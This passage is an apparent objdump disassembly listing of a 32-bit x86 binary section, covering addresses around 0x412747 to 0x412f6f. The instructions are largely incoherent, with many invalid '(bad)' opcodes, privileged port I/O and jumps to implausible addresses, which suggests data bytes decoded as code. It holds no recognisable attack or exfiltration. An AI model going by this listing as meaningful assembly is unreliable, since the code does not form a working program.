  412747:	mov    ah,BYTE PTR [esi+0x261d70b9]
  41274d:	pop    ebx
  41274e:	add    eax,0x2b81b155
  412753:	cmp    al,0x6b
  412755:	mov    dh,0xe3
  412757:	or     al,0x91
  412759:	in     al,dx
  41275a:	(bad)  
  41275b:	sub    BYTE PTR ss:[esi+0x6e5dfca6],al
  412762:	ins    DWORD PTR es:[edi],dx
  412763:	dec    esi
  412764:	dec    ecx
  412765:	sub    esp,0xffffffa1
  412768:	mov    dl,BYTE PTR [ecx-0x39]
  41276b:	pop    eax
  41276c:	cli    
  41276d:	test   ebp,ecx
  41276f:	add    eax,0x40
  412772:	fmulp  st(6),st
  412774:	out    0x18,al
  412776:	and    BYTE PTR [edx-0x3fd2eccd],0x20
  41277d:	and    edx,DWORD PTR [esp]
  412780:	ins    BYTE PTR es:[edi],dx
  412781:	sahf   
  412782:	and    ebx,DWORD PTR [edi+0x43b6d45f]
  412788:	cli    
  412789:	xchg   edi,eax
  41278a:	repnz enter 0xb4f7,0x63
  41278f:	aad    0xa9
  412791:	jmp    0x36ad7b6f
  412796:	scas   eax,DWORD PTR es:[edi]
  412797:	mov    bh,0x25
  412799:	idiv   DWORD PTR [eax-0x55]
  41279c:	out    0x4d,eax
  41279e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41279f:	dec    edi
  4127a0:	pop    eax
  4127a1:	pop    ebx
  4127a2:	stos   BYTE PTR es:[edi],al
  4127a3:	shl    BYTE PTR [edi+0x6a],0x40
  4127a7:	sbb    dh,BYTE PTR [edx+edx*1-0x5c]
  4127ab:	mov    ebp,0x3f38a3b9
  4127b0:	xchg   DWORD PTR [edx-0x1c],edi
  4127b3:	mov    esp,0xee45a705
  4127b8:	test   edi,eax
  4127ba:	mov    bh,0xbe
  4127bc:	mov    dh,0xb1
  4127be:	pop    ebp
  4127bf:	lods   al,BYTE PTR ds:[esi]
  4127c0:	mov    ds:0xfee2297f,al
  4127c5:	cmp    al,0xe6
  4127c7:	cmp    al,0x66
  4127c9:	scas   eax,DWORD PTR es:[edi]
  4127ca:	push   edi
  4127cb:	xchg   BYTE PTR [edi],bh
  4127cd:	ds mov edi,0x6473ceb8
  4127d3:	aas    
  4127d4:	sbb    BYTE PTR [ecx+edi*2-0x3d192bb5],al
  4127db:	hlt    
  4127dc:	ss into 
  4127de:	sub    BYTE PTR [edx+eiz*1+0x6e8ac337],cl
  4127e5:	pop    ds
  4127e6:	jp     0x412847
  4127e8:	dec    esi
  4127e9:	and    BYTE PTR [edx-0x5cee15e1],cl
  4127ef:	stos   BYTE PTR es:[edi],al
  4127f0:	mov    edx,0xb1da9ea1
  4127f5:	int3   
  4127f6:	in     eax,dx
  4127f7:	sbb    esi,ebx
  4127f9:	jb     0x4127c5
  4127fb:	std    
  4127fc:	sub    BYTE PTR [eax-0x79d20639],0x5b
  412803:	add    esp,edx
  412805:	push   0xf2593969
  41280a:	add    BYTE PTR [ebx],dh
  41280c:	ret    
  41280d:	xor    al,0x6c
  41280f:	ror    DWORD PTR [ebx+0x323a5d4a],1
  412815:	push   edi
  412816:	mov    eax,0x3347aa55
  41281b:	sbb    al,0x4e
  41281d:	aad    0x9a
  41281f:	ins    DWORD PTR es:[edi],dx
  412820:	or     al,ah
  412822:	fisttp DWORD PTR [eax-0x52c1762b]
  412828:	in     al,dx
  412829:	in     eax,0x30
  41282b:	clc    
  41282c:	push   0xb3d5072b
  412831:	loope  0x41286c
  412833:	mov    edx,DWORD PTR [ecx]
  412835:	cmp    al,0x96
  412837:	mov    ch,0x75
  412839:	pop    ecx
  41283a:	or     eax,0x4d882789
  41283f:	sub    al,0x5f
  412841:	add    cl,BYTE PTR ds:0xd41517b4
  412847:	(bad)  
  412848:	or     DWORD PTR ds:0xfa30fbba,eax
  41284e:	add    al,0x20
  412850:	pop    esp
  412851:	(bad)  
  412852:	pushf  
  412853:	push   eax
  412854:	inc    edi
  412855:	je     0x4128cb
  412857:	arpl   bx,si
  412859:	icebp  
  41285a:	imul   DWORD PTR [ebx-0x2aeba993]
  412860:	xor    eax,0x47a7b339
  412865:	dec    ecx
  412866:	js     0x41282f
  412868:	jg     0x412861
  41286a:	sbb    edx,eax
  41286c:	sbb    BYTE PTR [esi+esi*8-0x708b2e61],bh
  412873:	jecxz  0x4128f0
  412875:	push   ebx
  412876:	(bad)  
  412877:	pop    eax
  412878:	adc    ebx,esi
  41287a:	leave  
  41287b:	cmp    ebp,DWORD PTR [eax+0x55]
  41287e:	call   0x58b9562
  412883:	scas   eax,DWORD PTR es:[edi]
  412884:	std    
  412885:	sub    ecx,edi
  412887:	xchg   ebx,eax
  412888:	dec    esp
  412889:	lea    ebx,[esi+edi*4]
  41288c:	stc    
  41288d:	sub    al,0xa8
  41288f:	imul   ebx,DWORD PTR [edx],0xffffffa0
  412892:	ins    BYTE PTR es:[edi],dx
  412893:	pusha  
  412894:	aam    0xb4
  412896:	repz fmul st,st(4)
  412899:	pop    edi
  41289a:	es gs cmc 
  41289d:	retf   
  41289e:	push   esp
  41289f:	sub    DWORD PTR [eax-0x7d],ecx
  4128a2:	mov    BYTE PTR [esi+0x427fae77],ah
  4128a8:	xchg   ebx,eax
  4128a9:	call   0xf11a4469
  4128ae:	jb     0x4128da
  4128b0:	adc    ebp,ebp
  4128b2:	dec    ebp
  4128b3:	mov    edi,0x14142812
  4128b8:	pop    esi
  4128b9:	and    eax,0x3153c2d8
  4128be:	shl    DWORD PTR [eax-0x46b5f35a],0x67
  4128c5:	pop    es
  4128c6:	cld    
  4128c7:	lahf   
  4128c8:	js     0x412916
  4128ca:	daa    
  4128cb:	adc    BYTE PTR [eax+0x57],ch
  4128ce:	in     eax,dx
  4128cf:	ret    0x909b
  4128d2:	imul   ecx,DWORD PTR [eax],0xb284f0a2
  4128d8:	sti    
  4128d9:	xor    BYTE PTR [ebx-0x25],dl
  4128dc:	jae    0x412941
  4128de:	cs nop
  4128e0:	dec    ebx
  4128e1:	pop    ecx
  4128e2:	call   0x45f9e05f
  4128e7:	sub    eax,edi
  4128e9:	or     BYTE PTR [eax-0x5212ca41],dl
  4128ef:	aaa    
  4128f0:	or     eax,0x95a500fd
  4128f5:	pop    esi
  4128f6:	retf   0x1039
  4128f9:	addr16 pop ebp
  4128fb:	jmp    0x412927
  4128fd:	sbb    BYTE PTR [eax+0x1336e9ae],bh
  412903:	push   ss
  412904:	arpl   WORD PTR [ecx-0x3d],di
  412907:	fwait
  412908:	inc    esi
  412909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41290a:	and    al,0xe9
  41290c:	clc    
  41290d:	stc    
  41290e:	push   ecx
  41290f:	sub    ecx,DWORD PTR [ebp-0x7d81c2c0]
  412915:	jmp    0x4128e8
  412917:	dec    eax
  412918:	ffree  st(2)
  41291a:	je     0x4128b2
  41291c:	fcomp  QWORD PTR [ecx-0x5]
  41291f:	push   esi
  412920:	and    DWORD PTR [eax],ebx
  412922:	mov    ebx,DWORD PTR [ebx+0x29]
  412925:	mov    al,0x0
  412927:	push   eax
  412928:	jno    0x4128cd
  41292a:	xchg   esi,eax
  41292b:	in     al,0x27
  41292d:	cmp    al,0xd8
  41292f:	in     eax,dx
  412930:	lods   al,BYTE PTR ds:[esi]
  412931:	adc    BYTE PTR [edi+0x8eec97d],0x6b
  412938:	xchg   ebx,eax
  412939:	loope  0x4128d3
  41293b:	jns    0x412910
  41293d:	xchg   ebx,eax
  41293e:	(bad)  
  41293f:	es test ebp,edi
  412942:	adc    BYTE PTR [eax],ch
  412944:	xchg   ebp,eax
  412945:	dec    ebp
  412946:	pop    ds
  412947:	jnp    0x412967
  412949:	xor    DWORD PTR [eax-0x7b],edx
  41294c:	dec    ebp
  41294d:	push   0xffffff9f
  41294f:	mov    ds,ecx
  412951:	es fcomip st,st(1)
  412954:	fsub   DWORD PTR [edi+ebp*4+0x27]
  412958:	push   cs
  412959:	pop    ebp
  41295a:	mov    WORD PTR [edx+0x504765ba],?
  412960:	xlat   BYTE PTR ds:[ebx]
  412961:	bnd jnp 0x41299a
  412964:	js     0x4128f6
  412966:	add    dl,al
  412968:	iret   
  412969:	mov    ch,0x1b
  41296b:	imul   ebx,DWORD PTR [esi+eax*1],0xc56c9251
  412972:	mov    eax,ds:0xe6c2d909
  412977:	push   eax
  412978:	xchg   ebp,eax
  412979:	dec    ebx
  41297a:	fdivp  st(1),st
  41297c:	cli    
  41297d:	cwde   
  41297e:	int3   
  41297f:	aas    
  412980:	(bad)  
  412981:	loopne 0x412926
  412983:	pop    eax
  412984:	retf   
  412985:	xor    BYTE PTR ds:0xe898f72f,bl
  41298b:	ror    BYTE PTR [eax-0x17],1
  41298e:	jecxz  0x4129cd
  412990:	push   edi
  412991:	cmp    BYTE PTR [esi-0x959dd47],0xe8
  412998:	into   
  412999:	(bad)  
  41299a:	jecxz  0x4129b8
  41299c:	sbb    DWORD PTR [edx-0x236ca859],0xdb2dd021
  4129a6:	aad    0x9e
  4129a8:	and    al,0x95
  4129aa:	adc    al,BYTE PTR [edi+0x22]
  4129ad:	push   ecx
  4129ae:	cmp    eax,edx
  4129b0:	jmp    0x7277b793
  4129b5:	add    eax,DWORD PTR [edx-0x44]
  4129b8:	int    0x2
  4129ba:	jge    0x412a24
  4129bc:	call   0xc398:0x7fb6a8b5
  4129c3:	fs push edx
  4129c5:	shr    BYTE PTR [edx],1
  4129c7:	xlat   BYTE PTR ds:[ebx]
  4129c8:	std    
  4129c9:	ins    DWORD PTR es:[edi],dx
  4129ca:	adc    eax,DWORD PTR [eax+ebp*1-0xc842bbf]
  4129d1:	sbb    BYTE PTR [ebx],cl
  4129d3:	fdivp  st(3),st
  4129d5:	and    edi,DWORD PTR [esi-0x2f26e33e]
  4129db:	pusha  
  4129dc:	pop    edi
  4129dd:	dec    esi
  4129de:	fwait
  4129df:	push   ds
  4129e0:	stos   DWORD PTR es:[edi],eax
  4129e1:	xchg   ebx,eax
  4129e2:	sbb    ah,BYTE PTR ds:0x5e5c25f6
  4129e8:	push   edi
  4129e9:	outs   dx,DWORD PTR ds:[esi]
  4129ea:	je     0x412a07
  4129ec:	sbb    eax,0xaccd334d
  4129f1:	test   eax,0x54507afb
  4129f6:	or     ah,BYTE PTR [edx+ebx*8-0x1acd48c5]
  4129fd:	cld    
  4129fe:	cs cmc 
  412a00:	scas   al,BYTE PTR es:[edi]
  412a01:	test   BYTE PTR [esi+0x69],bh
  412a04:	or     al,0xc6
  412a06:	xchg   cl,bh
  412a08:	repz cdq 
  412a0a:	mov    ebx,gs
  412a0c:	dec    dl
  412a0e:	test   eax,0xba5a364c
  412a13:	push   es
  412a14:	bswap  esi
  412a16:	dec    eax
  412a17:	mov    dl,0xcf
  412a19:	(bad)  
  412a1a:	std    
  412a1b:	jmp    0xd3de47f4
  412a20:	int    0xaf
  412a22:	inc    esp
  412a23:	cmp    BYTE PTR [ecx],dh
  412a25:	popf   
  412a26:	or     eax,0x274523d
  412a2b:	dec    ebx
  412a2c:	cmp    dh,BYTE PTR [ecx-0x37809fee]
  412a32:	je     0x4129d0
  412a34:	inc    esp
  412a35:	push   ds
  412a36:	leave  
  412a37:	fstp   TBYTE PTR [ebx]
  412a39:	les    ecx,FWORD PTR [ecx+0x8aad15b]
  412a3f:	fcomp  DWORD PTR [ebp+ecx*4+0x9]
  412a43:	xchg   esp,eax
  412a44:	push   edi
  412a45:	adc    edx,DWORD PTR [esi+0x7e89164]
  412a4b:	inc    ebx
  412a4c:	repz shl BYTE PTR [edi-0x67],1
  412a50:	xor    ax,0x25e6
  412a54:	and    al,0x4d
  412a56:	cmp    DWORD PTR [edi+0x3be6a8c],edx
  412a5c:	fsubr  DWORD PTR [ecx-0x39]
  412a5f:	sbb    DWORD PTR [esi],0xcac90a61
  412a65:	pop    esp
  412a66:	cld    
  412a67:	clc    
  412a68:	lods   al,BYTE PTR ds:[esi]
  412a69:	repz shr DWORD PTR [esp+edx*2],1
  412a6d:	inc    ebp
  412a6e:	sub    ch,BYTE PTR [ecx-0x13]
  412a71:	sbb    al,0xac
  412a73:	pusha  
  412a74:	ret    0x2661
  412a77:	jne    0x412aa5
  412a79:	pop    edx
  412a7a:	aam    0x5b
  412a7c:	jno    0x412a88
  412a7e:	inc    esp
  412a7f:	mov    edi,0xf1bae940
  412a84:	(bad)  
  412a85:	mov    fs,WORD PTR [edx-0x654aab4a]
  412a8b:	jmp    0x641f:0xe071208b
  412a92:	mov    ebx,0x7f2b0ee9
  412a97:	pop    ss
  412a98:	cmp    bh,BYTE PTR [edx-0x21]
  412a9b:	cmc    
  412a9c:	stc    
  412a9d:	ins    DWORD PTR es:[edi],dx
  412a9e:	lods   eax,DWORD PTR ds:[esi]
  412a9f:	cmp    al,0xda
  412aa1:	lock cmp edx,DWORD PTR [ecx]
  412aa4:	dec    eax
  412aa5:	dec    esi
  412aa6:	(bad)  
  412aa7:	xchg   ecx,eax
  412aa8:	jmp    0x412af7
  412aaa:	retf   
  412aab:	push   ebx
  412aac:	push   es
  412aad:	sbb    eax,0x30255ac3
  412ab2:	(bad)  
  412ab3:	mov    al,0x7e
  412ab5:	push   ebx
  412ab6:	in     eax,0x27
  412ab8:	pop    edi
  412ab9:	out    dx,eax
  412aba:	aas    
  412abb:	xchg   edx,eax
  412abc:	and    eax,esp
  412abe:	icebp  
  412abf:	sub    al,BYTE PTR ds:0x6369afe3
  412ac5:	(bad)  
  412ac6:	mov    ebp,0x52267f4e
  412acb:	mov    ds:0xd41b6a5f,al
  412ad0:	fisubr WORD PTR [eax-0x1bd08138]
  412ad6:	shr    esp,0xe1
  412ad9:	fwait
  412ada:	gs (bad) 
  412adc:	imul   ecx,ebp,0x6
  412adf:	mov    ah,0x89
  412ae1:	push   0xffffffc0
  412ae3:	push   ebx
  412ae4:	loopne 0x412ac9
  412ae6:	jno    0x412b3b
  412ae8:	jne    0x412b23
  412aea:	sub    BYTE PTR [edi],bl
  412aec:	xor    ecx,0xc
  412aef:	inc    edx
  412af0:	or     eax,0x2d43cdc3
  412af5:	iret   
  412af6:	jmp    0x412b73
  412af8:	js     0x412b36
  412afa:	fcmovnbe st,st(2)
  412afc:	loop   0x412af4
  412afe:	outs   dx,BYTE PTR ds:[esi]
  412aff:	popf   
  412b00:	gs pop ebp
  412b02:	or     DWORD PTR [edi+0x342d49c4],ebp
  412b08:	cmp    al,0x81
  412b0a:	mov    edx,0x89ad469b
  412b0f:	xchg   ebp,eax
  412b10:	into   
  412b11:	lock fidivr DWORD PTR [ecx-0x21]
  412b15:	sub    ch,BYTE PTR [eax]
  412b17:	cwde   
  412b18:	push   0xffffff85
  412b1a:	xchg   esp,eax
  412b1b:	(bad)  
  412b1c:	cmp    al,ch
  412b1e:	ret    0x1fbe
  412b21:	sbb    al,0xd4
  412b23:	pop    esp
  412b24:	jb     0x412afb
  412b26:	pop    edx
  412b27:	stos   BYTE PTR es:[edi],al
  412b28:	xor    BYTE PTR [ecx],0x9a
  412b2b:	sbb    bh,dh
  412b2d:	jp     0x412acc
  412b2f:	mov    DWORD PTR [ebx-0x39],ebp
  412b32:	sar    DWORD PTR [ebx+0x45],1
  412b35:	mov    al,0x69
  412b37:	dec    edi
  412b38:	pop    DWORD PTR [edi-0x8d9c5d5]
  412b3e:	xor    dl,dl
  412b40:	fsub   st,st(0)
  412b42:	ud0    esp,DWORD PTR [eax]
  412b45:	mov    esp,0x4950140e
  412b4a:	mov    al,ds:0xc188ebdd
  412b4f:	leave  
  412b50:	(bad)  [ecx-0x64]
  412b53:	cwde   
  412b54:	into   
  412b55:	mov    al,BYTE PTR [eax]
  412b57:	not    bl
  412b59:	lods   al,BYTE PTR ds:[esi]
  412b5a:	retf   
  412b5b:	enter  0x7147,0x25
  412b5f:	outs   dx,DWORD PTR ds:[esi]
  412b60:	jnp    0x412b1d
  412b62:	jnp    0x412be0
  412b64:	add    eax,0x9de758fa
  412b69:	push   esp
  412b6a:	pop    ss
  412b6b:	sub    BYTE PTR [eax+0x37],dh
  412b6e:	mov    al,fs:0x6ae4d3bd
  412b74:	mov    bh,0x2a
  412b76:	inc    edx
  412b77:	fdivr  QWORD PTR [ebp+0x3e]
  412b7a:	pop    es
  412b7b:	xlat   BYTE PTR ds:[ebx]
  412b7c:	jb     0x412b93
  412b7e:	mov    bl,0x6
  412b80:	(bad)  
  412b81:	mov    cl,0x93
  412b83:	addr16 cmc 
  412b85:	mov    ebp,0x7cc5c745
  412b8a:	push   edi
  412b8b:	mov    ebx,0x14f3fa94
  412b90:	fldenv [esi]
  412b92:	shl    DWORD PTR [ebx-0x6c],1
  412b95:	jbe    0x412b48
  412b97:	mov    fs,WORD PTR [edi+0x730bf345]
  412b9d:	retf   0x3d25
  412ba0:	enter  0x6c68,0x93
  412ba4:	cwde   
  412ba5:	shr    bh,cl
  412ba7:	jns    0x412b40
  412ba9:	xchg   esp,eax
  412baa:	mov    BYTE PTR [edx],al
  412bac:	or     BYTE PTR es:[ebx],al
  412baf:	out    0x40,eax
  412bb1:	std    
  412bb2:	xor    ebx,ebx
  412bb4:	aad    0xa7
  412bb6:	loopne 0x412c09
  412bb8:	jmp    0x38a1:0xa564f9aa
  412bbf:	jge    0x412ba5
  412bc1:	xlat   BYTE PTR ds:[ebx]
  412bc2:	mov    ecx,0x4943c85
  412bc7:	mov    ds:0x3f040dc7,eax
  412bcc:	scas   al,BYTE PTR es:[edi]
  412bcd:	bound  edi,QWORD PTR [edi-0x30]
  412bd0:	lods   al,BYTE PTR ds:[esi]
  412bd1:	mov    bh,0x15
  412bd3:	push   ebx
  412bd4:	gs jne 0x412c05
  412bd7:	iret   
  412bd8:	push   edx
  412bd9:	adc    DWORD PTR [eax+0x69bc9919],esp
  412bdf:	nop
  412be0:	sbb    ch,0x2
  412be3:	stos   DWORD PTR es:[edi],eax
  412be4:	adc    bl,BYTE PTR [ecx+0x7411f104]
  412bea:	sbb    eax,0xa2387647
  412bef:	inc    esp
  412bf0:	call   DWORD PTR [eax-0x5a]
  412bf3:	sub    al,0xce
  412bf5:	pusha  
  412bf6:	lock out 0xa2,al
  412bf9:	inc    eax
  412bfa:	mov    al,0x1d
  412bfc:	jp     0x412c54
  412bfe:	hlt    
  412bff:	mov    esi,0x9493cbca
  412c04:	ret    
  412c05:	mov    esi,DWORD PTR [esi-0x7263fe1d]
  412c0b:	add    eax,0x699d5df9
  412c10:	ins    DWORD PTR es:[edi],dx
  412c11:	(bad)  
  412c12:	fimul  DWORD PTR [ebp+0x51]
  412c15:	inc    eax
  412c16:	mov    dh,0xbe
  412c18:	inc    ecx
  412c19:	imul   DWORD PTR [edi+0xf25b3dd]
  412c1f:	sub    ch,0x7a
  412c22:	cmp    bh,cl
  412c24:	jg     0x412c3f
  412c26:	jmp    0x631b:0x66cb5b3a
  412c2d:	or     al,0x3e
  412c2f:	test   BYTE PTR [edi+0x39],dl
  412c32:	lock add DWORD PTR [eax-0x32],esi
  412c36:	test   al,0x77
  412c38:	or     al,0x5b
  412c3a:	sbb    ch,dh
  412c3c:	nop
  412c3d:	jmp    0x412c6b
  412c3f:	xchg   edi,eax
  412c40:	jne    0x412bf9
  412c42:	jl     0x412ca0
  412c44:	pop    ebp
  412c45:	or     al,0x14
  412c47:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  412c49:	dec    ebp
  412c4a:	cmp    esi,ebp
  412c4c:	xor    eax,0x19e7d86d
  412c51:	hlt    
  412c52:	inc    esp
  412c53:	mov    al,ds:0xbe1da5d5
  412c58:	sub    bh,dl
  412c5a:	adc    DWORD PTR [ebx-0x19cf7880],eax
  412c60:	dec    esi
  412c61:	fstp   DWORD PTR [esi]
  412c63:	xor    BYTE PTR [ecx-0x316e08da],ch
  412c69:	ret    
  412c6a:	cmp    DWORD PTR [esi-0x41],edx
  412c6d:	imul   BYTE PTR [edi+0xc]
  412c70:	lds    ebx,FWORD PTR [edx+0x5b71c9fd]
  412c76:	shr    DWORD PTR [eax+0x1b580b03],1
  412c7c:	pop    es
  412c7d:	jmp    0x412cce
  412c7f:	mov    edx,0x6f368f7
  412c84:	mov    ah,0x7f
  412c86:	outs   dx,DWORD PTR fs:[esi]
  412c88:	mov    bh,0xfa
  412c8a:	jno    0x412c19
  412c8c:	pop    esi
  412c8d:	arpl   WORD PTR [esp+edx*1+0x36e88bff],ax
  412c94:	cmp    al,0x45
  412c96:	sbb    DWORD PTR [eax+0x0],edi
	...
  412d11:	add    BYTE PTR [eax],al
  412d13:	add    ah,dl
  412d15:	(bad)  
  412d16:	in     eax,dx
  412d17:	jp     0x412d08
  412d19:	jp     0x412cf2
  412d1b:	(bad)  
  412d1c:	jnp    0x412d5a
  412d1e:	adc    ecx,DWORD PTR [esi+0x4d]
  412d21:	xor    cl,BYTE PTR [ebp+0x72]
  412d24:	adc    ebp,0x76c0000
  412d2a:	add    BYTE PTR [eax],al
  412d2c:	call   0x5cc3571f
  412d31:	idiv   BYTE PTR [eax+0x9877375]
  412d37:	dec    ebx
  412d38:	mov    edi,0x34394c85
  412d3d:	je     0x412daa
  412d3f:	scas   al,BYTE PTR es:[edi]
  412d40:	ret    0xbcad
  412d43:	mov    esi,0xa40dbf3e
  412d48:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  412d4a:	popf   
  412d4b:	addr16 aad 0x41
  412d4e:	push   0xc
  412d50:	xlat   BYTE PTR ds:[ebx]
  412d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d52:	add    bl,ah
  412d54:	ror    BYTE PTR ds:0x376b9a0e,0x1c
  412d5b:	imul   esp,DWORD PTR [ebx],0x583735a6
  412d61:	mov    al,0x33
  412d63:	pop    ss
  412d64:	rcr    DWORD PTR [edi+0x45a2665],cl
  412d6a:	cmp    edi,DWORD PTR [ecx]
  412d6c:	mul    DWORD PTR [ebx]
  412d6e:	repz int3 
  412d70:	mov    bl,BYTE PTR [eax+eiz*8]
  412d73:	add    cl,BYTE PTR [eax-0x70e2f72e]
  412d79:	cli    
  412d7a:	fiadd  WORD PTR [eax]
  412d7c:	mov    dl,0xde
  412d7e:	imul   edi,DWORD PTR [eax-0x5e92380],0xffffffa1
  412d85:	stos   DWORD PTR es:[edi],eax
  412d86:	sub    eax,0xc5f88a51
  412d8b:	popf   
  412d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d8d:	(bad)  
  412d8e:	test   BYTE PTR [ebx+0x25],0x99
  412d92:	add    ebx,esi
  412d94:	inc    al
  412d96:	dec    esi
  412d97:	adc    BYTE PTR [edx+0x54],dl
  412d9a:	fdivr  st,st(3)
  412d9c:	xor    eax,0x610fe647
  412da1:	and    DWORD PTR [ebx+0x10],edi
  412da4:	in     al,0x75
  412da6:	xor    DWORD PTR [esi-0x74],ecx
  412da9:	fs ds cmp al,0xf0
  412dad:	sahf   
  412dae:	dec    ebx
  412daf:	mov    DWORD PTR [esi],edx
  412db1:	dec    edi
  412db2:	into   
  412db3:	or     edi,ebx
  412db5:	sub    BYTE PTR [ecx+0x7c83196d],ah
  412dbb:	cmp    edx,ecx
  412dbd:	inc    edi
  412dbe:	lods   eax,DWORD PTR ds:[esi]
  412dbf:	popa   
  412dc0:	fs call 0x16c222d0
  412dc6:	into   
  412dc7:	pusha  
  412dc8:	inc    ebp
  412dc9:	daa    
  412dca:	shl    DWORD PTR ds:0x87d69130,cl
  412dd0:	sti    
  412dd1:	or     esi,DWORD PTR [edi+ebx*8+0x195a34c4]
  412dd8:	sahf   
  412dd9:	adc    bh,cl
  412ddb:	dec    edi
  412ddc:	fsub   DWORD PTR [edx-0x2a79f4bd]
  412de2:	xchg   edi,eax
  412de3:	fimul  WORD PTR [eax-0x4c]
  412de6:	(bad)  
  412de7:	mov    eax,ds:0xff633ffc
  412dec:	pusha  
  412ded:	adc    eax,0x299f23a5
  412df2:	pop    edi
  412df3:	and    bl,al
  412df5:	popf   
  412df6:	mov    eax,0x3950fc8c
  412dfb:	mov    esi,0x9043e9ef
  412e00:	sar    DWORD PTR [ecx-0x733240a9],1
  412e06:	cmc    
  412e07:	ficomp WORD PTR [esi]
  412e09:	(bad)
  412e0d:	mov    esi,0x547a04d7
  412e12:	je     0x412dca
  412e14:	ror    DWORD PTR [ecx+0x1ad45f25],0x5
  412e1b:	xchg   ch,dl
  412e1d:	push   edx
  412e1e:	fcomi  st,st(7)
  412e20:	xchg   esp,eax
  412e21:	shl    BYTE PTR [ecx],0x47
  412e24:	add    al,0xf9
  412e26:	jno    0x412de6
  412e28:	int    0x59
  412e2a:	stos   DWORD PTR es:[edi],eax
  412e2b:	(bad)  [ebp-0x72ed1f19]
  412e31:	ins    BYTE PTR es:[edi],dx
  412e32:	jnp    0x412e19
  412e34:	xchg   edi,eax
  412e35:	stos   DWORD PTR es:[edi],eax
  412e36:	(bad)  
  412e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e38:	out    0x1a,al
  412e3a:	(bad)  
  412e3b:	jae    0x412e78
  412e3d:	rcl    DWORD PTR [edi-0x35],1
  412e40:	mov    dh,0x95
  412e42:	adc    ah,cl
  412e44:	mov    eax,ds:0x53611226
  412e49:	out    dx,eax
  412e4a:	mov    edi,0x5ee35d45
  412e4f:	pop    esi
  412e50:	mov    ebx,0x6c0792bc
  412e55:	(bad)  
  412e56:	cld    
  412e57:	lahf   
  412e58:	sbb    al,0xb
  412e5a:	mov    ds:0x5755fc18,al
  412e5f:	pop    edi
  412e60:	clc    
  412e61:	adc    al,0x54
  412e63:	cli    
  412e64:	xor    DWORD PTR [edi+ebp*2],ebx
  412e67:	cdq    
  412e68:	repz imul ebp,eax,0xffffffc6
  412e6c:	xor    eax,0x6b093858
  412e71:	or     ecx,DWORD PTR [ecx]
  412e73:	add    ch,0x77
  412e76:	inc    eax
  412e77:	jmp    0x412ef3
  412e79:	inc    eax
  412e7a:	or     esp,edx
  412e7c:	stc    
  412e7d:	pushf  
  412e7e:	test   eax,0x67a6a9f8
  412e83:	xor    BYTE PTR [ecx+0x45a2ae46],0xee
  412e8a:	shr    BYTE PTR [ebx],cl
  412e8c:	inc    esp
  412e8d:	jmp    FWORD PTR [eax-0x5]
  412e90:	dec    ebx
  412e91:	es addr16 push ecx
  412e94:	int3   
  412e95:	ja     0x412e64
  412e97:	adc    ebp,DWORD PTR [eax-0x123ea71c]
  412e9d:	add    ebp,esi
  412e9f:	mov    cl,0x6f
  412ea1:	and    dl,al
  412ea3:	xchg   esi,eax
  412ea4:	jg     0x412ee8
  412ea6:	jae    0x412ec7
  412ea8:	and    al,0xfa
  412eaa:	xchg   BYTE PTR [edi-0x331e0b54],bh
  412eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb1:	pop    edx
  412eb2:	sbb    esi,eax
  412eb4:	pop    edi
  412eb5:	loope  0x412edb
  412eb7:	sub    DWORD PTR [eax-0x683e8bf1],esp
  412ebd:	leave  
  412ebe:	std    
  412ebf:	and    DWORD PTR [eax+edi*1],edx
  412ec2:	cmp    BYTE PTR [edi],0x2d
  412ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec6:	shl    DWORD PTR [esp+edi*1-0x12006703],0x7
  412ece:	xor    DWORD PTR [ebp+0x710635de],0x8e7be187
  412ed8:	dec    esi
  412ed9:	scas   al,BYTE PTR es:[edi]
  412eda:	inc    esi
  412edb:	or     edx,DWORD PTR [eax+0x2be1d66a]
  412ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee2:	xchg   esi,eax
  412ee3:	cmp    ch,bl
  412ee5:	xchg   edx,eax
  412ee6:	pop    esp
  412ee7:	fs mov esp,0x8665bb8
  412eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eee:	add    esp,edx
  412ef0:	cmp    BYTE PTR [ebp-0x2f],bh
  412ef3:	xor    BYTE PTR [ecx-0x1a],bh
  412ef6:	xor    bl,bl
  412ef8:	xchg   esp,eax
  412ef9:	aam    0x73
  412efb:	pop    edi
  412efc:	int    0x48
  412efe:	adc    al,0x73
  412f00:	test   BYTE PTR [ebp-0x40f31c4f],bh
  412f06:	iret   
  412f07:	sub    DWORD PTR [edi],ebx
  412f09:	mov    cl,0x64
  412f0b:	dec    bx
  412f0d:	pop    esi
  412f0e:	mov    bl,al
  412f10:	stc    
  412f11:	les    ebp,FWORD PTR [edx-0x1c069ef6]
  412f17:	bound  eax,QWORD PTR [ebp-0x29801d1d]
  412f1d:	lds    edx,FWORD PTR [esi-0xe]
  412f20:	push   esp
  412f21:	push   edx
  412f22:	sbb    ecx,edx
  412f24:	pop    ebx
  412f25:	inc    edx
  412f26:	loope  0x412ec4
  412f28:	and    bh,bh
  412f2a:	packsswb mm2,QWORD PTR [eax-0x18]
  412f2e:	sub    al,0xd8
  412f30:	dec    ecx
  412f31:	mov    bl,0x67
  412f33:	outs   dx,DWORD PTR ds:[esi]
  412f34:	inc    edi
  412f35:	out    0xe4,al
  412f37:	adc    DWORD PTR [ebp+0x262de8e4],edi
  412f3d:	sbb    dl,al
  412f3f:	sbb    eax,0xfb3856b2
  412f44:	inc    esp
  412f45:	jge    0x412f5a
  412f47:	xor    BYTE PTR [esi-0x1c],ah
  412f4a:	mov    edi,0xfbee1389
  412f4f:	mov    DWORD PTR [eax+ebp*8-0x62240c41],ecx
  412f56:	enter  0xcadd,0xa1
  412f5a:	leave  
  412f5b:	sbb    BYTE PTR [esi-0x7d],ah
  412f5e:	mov    ebx,0x7239b16e
  412f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f64:	imul   ebx,DWORD PTR [ebx+0x72],0xb
  412f68:	push   ecx
  412f69:	cmp    eax,0x4c851796
  412f6e:	pusha  
  412f6f:	push   esp
